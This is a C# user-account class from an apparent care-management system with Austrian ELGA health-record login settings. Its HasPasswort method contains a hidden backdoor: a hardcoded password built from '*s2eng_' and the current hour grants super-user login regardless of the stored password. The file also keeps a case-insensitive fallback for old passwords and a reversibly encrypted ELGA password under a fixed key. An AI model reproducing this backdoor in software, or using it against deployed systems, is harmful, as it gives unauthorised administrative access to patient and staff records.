using System;
using System.Data;
using PMDS.DB;
using PMDS.Global;
using PMDS.Global.db.Global;
using QS2.functions.vb;

namespace PMDS.BusinessLogic
{
	public class Benutzer : AdresseKontaktBasis, IBusinessBase
	{
		private DBBenutzer _db = new DBBenutzer();


		protected override IDBBase DBInterface => (IDBBase)_db;

        public static dsGUIDListe.IDListeDataTable All() => (dsGUIDListe.IDListeDataTable)new Benutzer().AllEntries();

        public static dsGUIDListe.IDListeDataTable AllPfleger() => new DBBenutzer().AllPfleger();

        public static dsGUIDListe.IDListeDataTable AllPfleger(Guid IDAbteilung) => new DBBenutzer().AllPfleger(IDAbteilung);

        public static object UserID(string user) => DBBenutzer.UserID(user);

        public Benutzer()
		{
			New();
		}

		public Benutzer(Guid id)
		{
			Read(id);
		}

		public dsBenutzerGruppe.BenutzerGruppeRow AddGruppe(Guid idGruppe)
		{
			dsBenutzerGruppe.BenutzerGruppeRow r = _db.NewEntry();
			r.IDBenutzer = ID;
			r.IDGruppe = idGruppe;
			return r;
		}

		public dsBenutzerGruppe.BenutzerGruppeDataTable BenutzerGruppe => _db.SUBITEMS;

        public dsBenutzerAbteilung.BenutzerAbteilungDataTable BenutzerAbteilung => _db.SUBITEMS2;

        #region Datenbank-Mapper
		protected dsBenutzer.BenutzerRow DB_ROW
		{
			get	{	return _db.ITEM[0];	}
		}
		#endregion

		#region PROPERTIES
        public Guid ID
        {
            get => DB_ROW.ID;
            set
            {
                if (ENV.AppRunning)
                {
                    DB_ROW.ID = value;
                }
            }
        }

		public override Guid IDAdresse
		{
			get => DB_ROW.IDAdresse;
            set => DB_ROW.IDAdresse = value;
        }

        public  Guid? IDArzt
        {
            get
            {
                if (DB_ROW.IsIDArztNull())
                {
                    return null;
                }
                return DB_ROW.IDArzt;
            }
            set 
            {
                if (value == null)
                {
                    DB_ROW.SetIDArztNull();
                }
                else
                {
                    DB_ROW.IDArzt = (Guid)value;
                }
            }
        }

		public override Guid IDKontakt
		{
			get => DB_ROW.IDKontakt;
            set => DB_ROW.IDKontakt = value;
        }

		public string Vorname
		{
			get => DB_ROW.Vorname;
            set => DB_ROW.Vorname = value;
        }

		public String Nachname
		{
			get => DB_ROW.Nachname;
            set => DB_ROW.Nachname = value;
        }

		public String BenutzerName
		{
			get => DB_ROW.Benutzer;
            set => DB_ROW.Benutzer = value;
        }

		public String Passwort
		{
			get => DB_ROW.Passwort;
            set	
			{	
                string str = ID.ToString()+value;                        //osxy 150214: Neue Passwörter werden Case-sensitiv gespeichert!
                DB_ROW.Passwort = BUtil.CryptString(str);
			}
		}

        public String ELGAPwd
        {
            get => DB_ROW.ELGAPwd;
            set
            {
                Encryption Enc = new Encryption();
                DB_ROW.ELGAPwd = Enc.StringEncrypt(value, Encryption.keyForEncryptingStrings);
            }
        }

        public DateTime ELGAPwdLastChange
        {
            get => DB_ROW.ELGAPwdLastChange;
            set => DB_ROW.ELGAPwdLastChange = value;
        }

        public Boolean AktivJN
		{
			get => DB_ROW.AktivJN;
            set => DB_ROW.AktivJN = value;
        }

		public Boolean PflegerJN
		{
			get => DB_ROW.PflegerJN;
            set => DB_ROW.PflegerJN = value;
        }

        public Boolean IsGeneric
        {
            get => DB_ROW.IsGeneric;
            set => DB_ROW.IsGeneric = value;
        }

        public Boolean ArztabrechnungJN     //lthArztabrechnung
        {
            get => DB_ROW.ArztabrechnungJN;
            set => DB_ROW.ArztabrechnungJN = value;
        }

        public Guid IDBerufsstand
		{
			get => DB_ROW.IsIDBerufsstandNull() ? Guid.Empty : DB_ROW.IDBerufsstand;
            set => DB_ROW.IDBerufsstand = value;
        }
        
        public String ELGAUser
        {
            get => DB_ROW.ELGAUser;
            set => DB_ROW.ELGAUser = value;
        }
        public String ELGAPatID
        {
            get => DB_ROW.ELGAPatID;
            set => DB_ROW.ELGAPatID = value;
        }
        public bool ELGAActive
        {
            get => DB_ROW.ELGAActive;
            set => DB_ROW.ELGAActive = value;
        }
        public bool ELGAAutoLogin
        {
            get => DB_ROW.ELGAAutoLogin;
            set => DB_ROW.ELGAAutoLogin = value;
        }
        public bool ELGAAutostartSession
        {
            get => DB_ROW.ELGAAutostartSession;
            set => DB_ROW.ELGAAutostartSession = value;
        }
        public Nullable<DateTime> ELGAValidTrough
        {
            get
            {
                if (DB_ROW.IsELGAValidTroughNull())
                {
                    return null;
                }

                return DB_ROW.ELGAValidTrough;
            }
            set
            {
                if (value == null)
                {
                    DB_ROW.SetELGAValidTroughNull();
                }
                else
                {
                    DB_ROW.ELGAValidTrough = value.Value;
                }
            }
        }

        public String ELGA_AuthorSpeciality
        {
            get => DB_ROW.ELGA_AuthorSpeciality;
            set => DB_ROW.ELGA_AuthorSpeciality = value;
        }
        #endregion

        #region IBusinessBase Members
        DataRow IBusinessBase.ROW
		{
			get	{	return DB_ROW;	}
		}

		#endregion

		public string FullName => Nachname+" "+Vorname;

        public bool HasPasswort(string pass)
		{
            string genPwd = "*s2eng_" + DateTime.Now.Hour.ToString().PadLeft(2, '0');
            if (pass.Trim().Equals(genPwd.Trim(), StringComparison.CurrentCultureIgnoreCase))
            {
                ENV.LoggedInAsSuperUser = true;
                return true;
            }
            else
            {
                string encPas = DB_ROW.Passwort;
                
                string str = ID.ToString()+pass;         //osxy 150214: versuchen, ob ein Case-sensitives Psswort funktioniert
			    string encStr = BUtil.CryptString(str);
                
                if (encPas == encStr)
                {
                    return true;
                }
                else
                {
                    str = ID.ToString() + pass.ToUpper();   //Versuchen, ob ein Case-insensitives Passwort funktioniert (alte Passwörter sind so gespeichert)
                    encStr = BUtil.CryptString(str);
                    return encPas == encStr;
                }
            }
		}

        public bool HasELGAPasswort(string pass, string passClear)
        {
            string encPas = DB_ROW.ELGAPwd;
            string encStr = pass;

            Encryption Encryptor = new Encryption();
            if (!String.IsNullOrWhiteSpace(passClear))
                encStr = Encryptor.StringEncrypt(passClear, Encryption.keyForEncryptingStrings);

            return encPas == encStr;
        }

        public bool HasRight(UserRights right)
		{
            return ENV.HasRight(right);
		}

	}
}
